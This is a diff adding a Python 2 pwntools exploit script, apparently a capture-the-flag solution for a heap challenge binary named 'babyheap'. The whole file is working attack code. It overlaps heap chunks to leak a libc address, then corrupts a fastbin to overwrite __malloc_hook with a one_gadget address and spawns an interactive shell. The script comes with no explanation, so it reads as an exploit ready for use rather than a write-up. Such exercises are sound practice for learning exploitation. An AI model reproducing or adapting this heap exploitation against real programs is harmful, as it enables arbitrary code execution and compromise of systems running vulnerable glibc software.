@@ -1,0 +1,76 @@
+#!/usr/bin/env python2
+
+import sys,os
+from pwn import *
+
+context.update(arch="amd64", endian="little", os="linux", )
+
+TARGET=os.path.realpath("babyheap")
+
+OG = 0x4526a
+MHO = 0x3c4aed
+
+def allocate(size):
+    r.sendlineafter("Command: ","1")
+    r.sendlineafter("Size: ",str(size))
+    r.recvline()
+
+def fill(index, message):
+    r.sendlineafter("Command: ","2")
+    r.sendlineafter("Index: ",str(index))
+    r.sendlineafter("Size: ",str(len(message)))
+    r.sendafter("Content: ",message)
+
+def free(index):
+    r.sendlineafter("Command: ","3")
+    r.sendlineafter("Index: ",str(index))
+
+def dump(index):
+    r.sendlineafter("Command: ","4")
+    r.sendlineafter("Index: ",str(index))
+
+
+def exploit(r):
+    allocate(0x10)
+    allocate(0x90)
+    allocate(0x90)
+    allocate(0x10) # boundary to prevent coalescing with top chunk
+    
+    fill(0,p64(0)*3+p64(0x141))
+    free(1)
+    allocate(0x130)
+    fill(1,p64(0)*19+p64(0xa1))
+    free(2)
+    dump(1)
+    r.recv(170)
+    libcbase = u64(r.recv(8))-0x3c4b78
+    
+    allocate(0x80)
+    allocate(0x60)
+    allocate(0x60)
+    allocate(0x60)
+    free(5)
+    free(6)
+
+    payload = p64(0)*13
+    payload+=p64(0x71)
+    payload+=p64(libcbase+MHO)
+    fill(4, payload)
+    
+    allocate(0x60)
+    allocate(0x60)
+    allocate(0x60)
+    
+    fill(7, "A"*3+p64(libcbase+OG)*4)
+    
+    r.sendlineafter("Command: ","1")
+    r.sendlineafter("Size: ","1")
+    
+    r.interactive()
+    return
+
+if __name__ == "__main__":
+    LOCAL = True
+    r = process([TARGET,])
+    exploit(r)
+    sys.exit(0)
